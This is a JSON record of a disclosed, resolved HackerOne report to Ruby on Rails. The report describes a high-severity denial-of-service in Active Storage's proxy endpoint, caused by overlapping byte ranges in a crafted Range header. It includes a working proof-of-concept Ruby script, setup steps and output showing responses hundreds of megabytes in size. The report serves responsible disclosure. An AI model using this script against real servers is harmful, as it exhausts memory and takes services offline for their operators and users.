{
  "id": 2307813,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzA3ODEz",
  "url": "https://hackerone.com/reports/2307813",
  "title": "DoS with crafted \"Range\" header",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2024-01-08T14:54:36.033Z",
  "submitted_at": "2024-01-08T14:54:36.153Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-06-25T09:29:59.053Z",
  "bug_reporter_agreed_on_going_public_at": "2024-05-26T09:29:54.491Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I have crafted a request header for \"range\" against proxy url in Active Storage and confirmed that it will be a DoS.\n\nhttps://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/active_storage/blobs/proxy_controller.rb#L14\n\n```ruby\n  def show\n    if request.headers[\"Range\"].present?\n      send_blob_byte_range_data @blob, request.headers[\"Range\"]\n```      \n\nhttps://github.com/rails/rails/blob/v7.1.2/activestorage/app/controllers/concerns/active_storage/streaming.rb#L14\n\n```ruby\n    def send_blob_byte_range_data(blob, range_header, disposition: nil)\n      ranges = Rack::Utils.get_byte_ranges(range_header, blob.byte_size)\n```\n\nThe `Range` object returned by [Rack::Utils.get_byte_ranges](https://github.com/rack/rack/blob/v3.0.8/lib/rack/utils.rb#L435) will never exceed the file size, but there is no restriction on overlapping ranges.\n\n```ruby\n❯ bundle exec rails c\nLoading development environment (Rails 7.1.2)\nirb(main):001> Rack::Utils.get_byte_ranges(\"bytes=20-40\", 200)\n=> [20..40]\nirb(main):002> Rack::Utils.get_byte_ranges(\"bytes=20-200,0-200,0-200,-200,-200,\", 200)\n=> [20..199, 0..199, 0..199, 0..199, 0..199]\n```\n\n## PoC\n\n```\n❯ ruby -v\nruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]\n\n❯ rails new range_dos -G -M -C -A -J -T \n=>  Rails 7.1.2, Rack 3.0.8\n\n❯ cd range_dos\n\n❯ bin/rails active_storage:install\n\n❯ bin/rails generate model User avatar:attachment \n\n❯ bin/rails db:migrate   \n```\n\n`config/routes.rb`\n\n```ruby\nRails.application.routes.draw do\n  resources :users\n  get \"up\" => \"rails/health#show\", as: :rails_health_check\nend\n```\n\n`app/controllers/users_controller.rb`\n\n```ruby\nclass UsersController < ApplicationController\n\n  def new\n    @user = User.new\n  end\n\n  def create\n    user = User.create!(user_params)\n    redirect_to \"/users/#{user.id}\"\n  end\n\n  def show\n    @user = User.find(params[:id])\n  end\n\n  private\n    def user_params\n      params.require(:user).permit(:avatar)\n    end\nend\n```\n\n`app/views/users/new.html.erb`\n\n```html\n<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>\n  <%= form.file_field :avatar %><br>\n  <%= form.submit %>\n<% end %>\n```\n\n`app/views/users/show.html.erb`\n\n```html\n<% if @user.avatar.attached? %>\n  <%= image_tag rails_storage_proxy_path(@user.avatar) %>\n<% end %>\n```\n\nstart server\n\n```\n# Comment out `config.force_ssl = true` in production.rb\n❯ RAILS_ENV=production bundle exec rails s\n```\n\nAfter uploading the file on the `http://0.0.0.0:3000/users/new` screen, copy the proxy url that appears on the screen.\nSends the request using a crafted header for the url.\n\n`range_request.rb`\n\n```ruby\nrequire 'net/http'\n\n# set proxy url\nurl = URI.parse('http://0.0.0.0:3000/rails/active_storage/blobs/proxy/...')\n\nreq = Net::HTTP::Get.new(url.path)\n\n# length = 8000 # Bad request\n\nlength = (80 * 1024 - \"bytes=\".bytesize) /  \"-999999999,\".bytesize\nputs length \n\nreq[\"Range\"] = \"bytes=\" + \"-999999999,\" * length \n\nres = Net::HTTP.start(url.host, url.port) {|http|\n  http.request(req)\n}\n\nputs res.message\nputs res.body.bytesize\n```\n\n```\n❯ ruby range_request.rb\n7446\nPartial Content\n410058706\n```\n\nIf the target file is about 50 KB, each request will increase memory usage by several hundred MB.\nIf the file is nearly 1 MB, more than 10 GB of memory was used on the server side.\n\n## Impact\n\nWhen accessing the url of proxy, it is possible to put a load on the server's memory usage, etc., by repeatedly writing values in the `Range` request header. Even if the attacker stops the request midway through, the server continues to prepare data, making the attack more efficient.\n\nThe same problem exists with [Rack::Files](https://github.com/rack/rack/blob/main/lib/rack/files.rb#L85), but the problem is more serious with Active Stroage, which deals with files uploaded by users.\n\nAdditionally, when using nginx, the header length is limited to 8KB, which reduces the impact of the attack. 80KB is set in unicorn and puma.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-06-25T09:29:54.646Z",
  "allow_singular_disclosure_after": -39086171.55077582,
  "singular_disclosure_allowed": true,
  "vote_count": 24,
  "voters": [
    "leodog896",
    "a92847865",
    "zy9ard3",
    "elmahdi",
    "neilx",
    "ahmed_xyz",
    "4xpl0r3r",
    "rashedul_css",
    "mr_reboo",
    "shadow1418",
    "and 14 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
